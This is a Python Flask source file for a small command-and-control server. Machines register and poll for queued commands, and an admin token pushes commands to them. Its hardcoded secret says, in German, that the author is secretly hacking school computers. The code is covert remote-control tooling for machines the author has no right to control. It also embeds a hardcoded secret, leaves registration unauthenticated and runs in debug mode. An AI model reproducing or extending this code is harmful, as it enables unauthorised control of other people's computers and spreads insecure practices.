from operator import attrgetter

from flask import Flask, make_response, request
import management
import jwt

from management import Device

SECRET = "iCH hAcKe scHuLcomPuTer, aBer das DaRf niemAnd wIsSen!1!"
DEVICES_STORAGE_LOCATION = "devices.txt"
DEVICE_PREFIX = "DEV_"

devices = management.DeviceStorage.load_devices(DEVICES_STORAGE_LOCATION)

app = Flask(__name__)

@app.post("/register")
def register():
    hostname = request.get_data().decode()
    token = jwt.encode({"sub": DEVICE_PREFIX+hostname}, SECRET, "HS256")
    devices.devices.append(Device(hostname))
    return token

@app.get("/active")
def active():
    return make_response(devices.active())

@app.post("/active/<device_hostname>")
def activate(device_hostname):
    token = request.headers.get("Token")
    try:
        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            devices[device_hostname].active = True

@app.post("/inactive/<device_hostname>")
def inactivate(device_hostname):
    token = request.headers.get("Token")
    try:
        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            devices[device_hostname].active = False


@app.post("/commands/add/")
def add_command():
    token = request.headers.get("Token")
    device_hostname = request.headers.get("Device")
    try:
        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            data = request.get_data().decode()
            cmd = management.Command.import_from_string(data)
            print(device_hostname)
            device = devices.get_device(device_hostname)
            if not device:
                print(f"Device {device_hostname} not found in devices.")
                return "DEVICE NOT FOUND", 404
            device.put(cmd)
            return "SUCCESS", 200


@app.get("/commands/get")
def get_command():
    token = request.headers.get("Token")
    try:
        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if not payload["sub"].startswith("DEV_"):
            return "INVALID TOKEN", 401
        device_hostname = payload["sub"][4:]
        device = devices.get_device(device_hostname)
        if not device:
            print(f"Device {device_hostname} not found in devices.")
            return "DEVICE NOT FOUND", 404
        cmd = device.get()
        return cmd.export_to_string()

if __name__ == '__main__':
    token = jwt.encode({"sub": "theOnlyLino"}, SECRET, algorithm="HS256")
    print(f"Admin-Token: {token}")
    app.run(debug=True)
